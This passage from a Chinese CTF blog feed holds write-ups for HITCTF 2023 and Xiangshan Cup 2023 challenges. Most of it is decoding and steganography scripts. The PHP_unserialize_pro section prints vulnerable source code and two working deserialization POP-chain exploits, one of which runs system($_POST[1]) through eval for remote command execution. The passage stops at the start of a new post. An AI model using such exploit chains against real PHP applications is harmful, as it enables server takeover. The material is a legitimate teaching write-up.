<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
<p>然后每次的功能码3，进行一次新的修改操作</p>
<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
<p>到90 93发现flag已经格式完整</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
<p>单纯菜，qwq~~</p>
<h2 id="network-in-network">network-in-network</h2>
<p>先来看一下官方给的</p>
<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
<p>我再研究研究，qwq</p>
<h2 id="H1F1">H1F1</h2>
<p>这道题就讲一下思路吧，不想动手复现了</p>
<p>根据官方wp和吉大师傅的简单操作了一下</p>
<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
<p>只能说学到了一个新的知识：音频diff</p>
<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
<p>可以发现下图的怪异bit点</p>
<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
<p>进行读取二进制0和1，最后转字符串就行了</p>
<h2 id="总结">总结</h2>
<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
<p>出题人太懂出题了（悲</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>HITCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023香山杯-Writeup</title>
    <url>/2023/10/16/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-Writeup/</url>
    <content><![CDATA[<h1>2023香山杯-Writeup</h1>
<h2 id="Misc">Misc</h2>
<h3 id="签到">签到</h3>
<p>aW9kant6aDFmMHAzXzJfRndpfQ==</p>
<p>base64+凯撒</p>
<img src="https://s2.loli.net/2023/10/16/lCG8IXhfZFtNxdW.png" style="zoom: 67%;" />
<h3 id="pintu">pintu</h3>
<p>这题赛中被折磨了，思路出了偏差~~~</p>
<p>赛后感谢某位师傅的讲解~</p>
<p>首先本题观察一下本题所拿到的附件</p>
<p><img src="https://s2.loli.net/2023/10/16/wPJbqKApk2oDisa.png" alt=""></p>
<img src="https://s2.loli.net/2023/10/16/euzwkJIiQN5BMjf.jpg" style="zoom:67%;" />
<p>做了一个简单统计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片大小 (65, 67): 802 张</span><br><span class="line">图片大小 (65, 70): 699 张</span><br><span class="line">图片大小 (65, 64): 164 张</span><br><span class="line">图片大小 (65, 40): 1567 张</span><br><span class="line">图片大小 (65, 66): 351 张</span><br><span class="line">图片大小 (65, 65): 338 张</span><br><span class="line">图片大小 (65, 71): 210 张</span><br><span class="line">图片大小 (65, 61): 139 张</span><br><span class="line">图片大小 (65, 62): 112 张</span><br><span class="line">图片大小 (65, 60): 185 张</span><br><span class="line">图片大小 (65, 63): 136 张</span><br></pre></td></tr></table></figure>
<p>我刚开始的思路其实是可不可能存在八种规格的图片，将起对应八进制进行转换，但是好像不行，emmm~~~</p>
<p>然后赛后看到了原来本题的重点是在于高度和黑白，以及还有一些以前没见过的隐写利用。</p>
<p>首先可以看到，不同的图片具有几种宽度，同时提示里给出了8-&gt;10，这是在按提示将八进制数字转换为十进制数字，图片的高度有40，60-67，70，71，对应于十进制32，48-55，56，57，对应于ASCII空格，‘0’-‘9’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 指定图片所在文件夹的路径</span></span><br><span class="line">folder_path = <span class="string">&#x27;./pintu&#x27;</span>  <span class="comment"># 请替换为实际文件夹的路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">octal_to_decimal</span>(<span class="params">octal_number</span>):</span><br><span class="line">    decimal_number = <span class="number">0</span></span><br><span class="line">    position = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 从右到左遍历八进制数的每一位</span></span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> <span class="built_in">reversed</span>(octal_number):</span><br><span class="line">        <span class="comment"># 将每一位的字符转换为整数</span></span><br><span class="line">        digit_value = <span class="built_in">int</span>(digit)</span><br><span class="line">        <span class="comment"># 使用位权计算十进制值并累加</span></span><br><span class="line">        decimal_number += digit_value * (<span class="number">8</span> ** position)</span><br><span class="line">        position += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> decimal_number</span><br><span class="line"><span class="comment"># 打开一个名为&quot;10进制.txt&quot;的文件，准备写入数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;010.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="comment"># 循从1到4703读取图片高度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4704</span>):</span><br><span class="line">        <span class="comment"># 构建图片文件名，假设图片文件名格式为&quot;image_1.jpg&quot;，&quot;image_2.jpg&quot;等</span></span><br><span class="line">        image_filename = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">        image_path = os.path.join(folder_path, image_filename)</span><br><span class="line">        <span class="comment"># 打开图片</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">        <span class="comment"># 获取图片的高度</span></span><br><span class="line">        height = img.height</span><br><span class="line">        <span class="comment">#将高度当成八进制转换为十进制，再转换为字符串</span></span><br><span class="line">        height_decimal = <span class="built_in">chr</span>(octal_to_decimal(<span class="built_in">str</span>(height)))</span><br><span class="line">        <span class="comment"># 将数据写入文件</span></span><br><span class="line">        output_file.write(<span class="string">f&#x27;<span class="subst">&#123;height_decimal&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 打开文件以读取数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;010.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"><span class="comment"># 分割字符串，将数字提取出来</span></span><br><span class="line">numbers = data.split()</span><br><span class="line"><span class="comment"># 将每个数字转换为 ASCII 字符，并构建字符串</span></span><br><span class="line">ascii_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> numbers])</span><br><span class="line"><span class="comment"># 将ASCII字符串编码为字节数组</span></span><br><span class="line">ascii_bytes = ascii_string.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment"># 使用base64.b32decode解码为字节数组</span></span><br><span class="line">decoded_bytes = base64.b32decode(ascii_bytes)</span><br><span class="line"><span class="comment"># 将解码后的字节数组转换为字符串</span></span><br><span class="line">decoded_string = decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment"># 打印 ASCII 编码的字符串</span></span><br><span class="line"><span class="built_in">print</span>(ascii_string)</span><br><span class="line"><span class="comment"># 打印解码后的字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="comment"># 将解码后的字节数组转换为字符串</span></span><br><span class="line">    decoded_string = decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    output_file.write(<span class="string">f&#x27;<span class="subst">&#123;decoded_string&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最终是得到了一个疑似base的字符串，但明显换表了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LK1vE7eNJu8g1GRUdM5UE0QKLuKK1k5UdMKNdM5UdKKcdM7UdM5UMIPcnMXUdM5UMc5vEK15IvDqm6Dqnk7um6DlXuuqCuXUm6DqdBndm6RNMvDqdM5um6RNdMuqnk5Um6DldM5dm6RUMvRUdM5udBnUdM5NdM5Unk7UdM5QXu5UEMdqm6DldM5UXu7tE6RTdM5Udb8pjuKXK0ukLbu6KB0LEuXedB45i5nJJ/aIKvxqJBXStMXH1kRuKGTGtVRuIru6jMaXKBQpL7nkLB1uQV0mtKeGIrKMKI0VEMPqMNQFKtRPMV4HANUKMM5XnIKmd/V79V5HM/eeMKQCiu1uQEoqKK3wi5KHdy0wL5U6t702KMJZjM01ncXaMkRHjulwd09lM68xigKJ9b4vL75L37VNtgKeJ/5pJV12KuM6Qg199Va2L7at9EeciMXrMKQJ97nvQknrKw5yQI82nG7SIMPU1VPCib4K1GabiM4dIg4w3rQC3BKXnG00tM0EM05xIy1mKc0TJ7u7MVxNtG0t3baQXyowENeyEw11CB4rnVXAQbxwCrKp3GaAir7VIVnAtNaS374TJb12mGK/tcoGtEnuirKaMwVkjBVpEw4l3u8wXEn11VKPdKS69b8PnN4HJk2qEVQ0iIdwKB4aib4vJNQ4mkRS37a/tbaPQMe/J/QIXr4ztgS7IE9qM/sN1GXSi01Kjw4AIuDPnMkZLg3p1E569M2wAN5FjIXMncKVKM4FtNK7Qw1dn0o7iE5XJNQf1c4IjBoNiy07igXHKB3TjblPEkK6IbRlM5ae9MxZjIeFXV71JkP8JrnxX50yX/58Kb0Ijb1kmk9qMt85JGX03E5hKI5EnN4hEu7M3MamCIRaXk7V37083/4Bdb9lXMlp3KU4iB9NKcSpL6R6Xc16nk8b3G971VR8dM5UdM55ju1ML7Q7MI7cd6so1r5k9EaajI5/1tRZjb3Y9b5w1E9k</span><br></pre></td></tr></table></figure>
<p>然后是第二个利用，识别图片，将黑色看成0，白色看成1，作为二进制字符串输出，并转用ASCII 码转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 指定图片所在文件夹的路径</span></span><br><span class="line">folder_path = <span class="string">&#x27;./pintu&#x27;</span>  <span class="comment"># 请替换为实际文件夹的路径</span></span><br><span class="line"><span class="comment"># 创建一个空列表，用于存储结果</span></span><br><span class="line">binary_values = []</span><br><span class="line"><span class="comment"># 循环从1到4703读取图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4704</span>):</span><br><span class="line">    <span class="comment"># 构建图片文件名，假设图片文件名格式为&quot;image_1.jpg&quot;，&quot;image_2.jpg&quot;等</span></span><br><span class="line">    image_filename = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">    image_path = os.path.join(folder_path, image_filename)</span><br><span class="line">    <span class="comment"># 打开图片</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="comment"># 将图片转换为黑白模式</span></span><br><span class="line">    bw_image = img.convert(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取像素数据</span></span><br><span class="line">    pixels = <span class="built_in">list</span>(bw_image.getdata())</span><br><span class="line">    <span class="comment"># 检查是否存在黑色像素（0），如果存在则添加0，否则添加1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> pixels:</span><br><span class="line">        binary_values.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        binary_values.append(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 将生成的二进制值连接在一起，不使用分隔符</span></span><br><span class="line">binary_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary_values))</span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(binary_string)</span><br><span class="line"><span class="comment"># 在二进制字符串前面补充一个0</span></span><br><span class="line">binary_string_with_prefix = <span class="string">&#x27;0&#x27;</span> + binary_string</span><br><span class="line"><span class="comment"># 将二进制字符串转换为字节对象</span></span><br><span class="line">byte_data = <span class="built_in">bytes</span>([<span class="built_in">int</span>(binary_string_with_prefix[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string_with_prefix), <span class="number">8</span>)])</span><br><span class="line"><span class="comment"># 将字节对象解码为UTF-8文本</span></span><br><span class="line">utf8_text = byte_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(utf8_text)</span><br></pre></td></tr></table></figure>
<img src="https://s2.loli.net/2023/10/16/5R3rNuz81twsxVq.png"  />
<p>得到码表</p>
<p>进行解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;LK1vE7eNJu8g1GRUdM5UE0QKLuKK1k5UdMKNdM5UdKKcdM7UdM5UMIPcnMXUdM5UMc5vEK15IvDqm6Dqnk7um6DlXuuqCuXUm6DqdBndm6RNMvDqdM5um6RNdMuqnk5Um6DldM5dm6RUMvRUdM5udBnUdM5NdM5Unk7UdM5QXu5UEMdqm6DldM5UXu7tE6RTdM5Udb8pjuKXK0ukLbu6KB0LEuXedB45i5nJJ/aIKvxqJBXStMXH1kRuKGTGtVRuIru6jMaXKBQpL7nkLB1uQV0mtKeGIrKMKI0VEMPqMNQFKtRPMV4HANUKMM5XnIKmd/V79V5HM/eeMKQCiu1uQEoqKK3wi5KHdy0wL5U6t702KMJZjM01ncXaMkRHjulwd09lM68xigKJ9b4vL75L37VNtgKeJ/5pJV12KuM6Qg199Va2L7at9EeciMXrMKQJ97nvQknrKw5yQI82nG7SIMPU1VPCib4K1GabiM4dIg4w3rQC3BKXnG00tM0EM05xIy1mKc0TJ7u7MVxNtG0t3baQXyowENeyEw11CB4rnVXAQbxwCrKp3GaAir7VIVnAtNaS374TJb12mGK/tcoGtEnuirKaMwVkjBVpEw4l3u8wXEn11VKPdKS69b8PnN4HJk2qEVQ0iIdwKB4aib4vJNQ4mkRS37a/tbaPQMe/J/QIXr4ztgS7IE9qM/sN1GXSi01Kjw4AIuDPnMkZLg3p1E569M2wAN5FjIXMncKVKM4FtNK7Qw1dn0o7iE5XJNQf1c4IjBoNiy07igXHKB3TjblPEkK6IbRlM5ae9MxZjIeFXV71JkP8JrnxX50yX/58Kb0Ijb1kmk9qMt85JGX03E5hKI5EnN4hEu7M3MamCIRaXk7V37083/4Bdb9lXMlp3KU4iB9NKcSpL6R6Xc16nk8b3G971VR8dM5UdM55ju1ML7Q7MI7cd6so1r5k9EaajI5/1tRZjb3Y9b5w1E9k&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到关键信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEwAAAAUCAMAAAAQlCuDAAAAP1BMVEX/////wMD//8DA/8DA///AwP//wP//AAD//wAA/wAA//8AAP//AP/AAADAwAAAwAAAwMAAAMDAAMD///8AAADMRO/yAAABkklEQVQ4ja2UyZLDIAxExWL2zVT+/1tHIDngODWnvJODXa2mJQUskkWtivD6IKIRvXeTUidMLoSszU/qRHn+pUQAQueKBy5bAnRrIQSNxFD58/UW3xUnB9shPrKYhUC0mIYt4iSOnlN3BV8S+lxuLbhBkQZsY7HuI2qk2FhTE24vXbJhkZRa2CyDFQSLcWB7GFW1c5khwmHYLAfLNzhUgjfyHPXxspcNquQwieIISRQlZ6KT9y3Q5RK7KiRrjMF83OrcO6Y9xFvDJ6k38eksjJxmdZGJKzHsXy2fh/egH86I7DxeiS94my+O8xpKsE7YfEqAR2bkqwxn3J/NCeyd3UxizhB3sa/OHsZgJjq5Bg2sVDhjHr5Y6/Rp7gdHzVUo8JXO1uM0hw+e1raJ3+qzmdTt5dUHzKuu76PvX5y1Q3sOd8Vmx7z9uxtnUw9nn1OErZoxPZIaK0mbzFMY3Lm0glDYcFqmViVnft/F/Q+E3deq1bUaSwxbLMTqJK9oiGMdsYmrxWBf8EN+qPayv7T2+k/rD6rwKfsf5fOmAAAAAElFTkSuQmCC  </span><br><span class="line">data:image/png;base64</span><br></pre></td></tr></table></figure>
<p>用base转换为图片</p>
<img src="https://s2.loli.net/2023/10/16/kIpf1dmY6XhSjyQ.png" style="zoom:200%;" />
<p>最后是使用了Piet得到的flag，详情可以看这个<a href="https://blog.csdn.net/MarkRao/article/details/121796707">Piet一种奇葩编程语言——利用在CTF中Piet的套路应该很多</a></p>
<p><img src="https://s2.loli.net/2023/10/16/cpoZUDqsduIQCa9.png" alt=""></p>
<h2 id="Web">Web</h2>
<h3 id="PHP-unserialize-pro">PHP_unserialize_pro</h3>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;Wh0 4m I?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;U R A BAD GUY&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">            <span class="variable">$function</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>研究了几位师傅的exp，姿势确实多</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;A_G00d_H4ck3r&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">    <span class="comment">//本地调试打好的题</span></span><br><span class="line"><span class="comment">//    public $shell = &#x27;strtolower&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;dir ../../../../../&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="comment">//    public $cmd = &#x27;dir&#x27;;</span></span><br><span class="line"><span class="comment">//    public $cmd = &#x27;more /[e-h]1[0-b][e-h]&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;sort /[!q]1[!q][!q]&#x27;</span>;</span><br><span class="line"><span class="comment">//    public $cmd = &#x27;cd /;echo `more dir`&#x27;;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__invoke会在把对象当作一个方法调用的时候自动调用</span></span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;U R A BAD GUY&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">G00d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arg = <span class="keyword">new</span> <span class="title class_">H4ck3r</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">G00d</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H4ck3r</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">H4ck3r</span>();</span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title class_">G00d</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;name=<span class="string">&quot;A_G00d_H4ck3r&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;arg = <span class="variable">$h</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;func = <span class="variable">$g</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;shell=<span class="string">&quot;urldecode&quot;</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;cmd = <span class="string">&quot;system(\$_POST[1]);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（1）Alice-AI系列</title>
    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
<h2 id="2022-CTF">2022*CTF</h2>
<h3 id="Alice’s-challenge">Alice’s challenge</h3>
<p>题目描述</p>
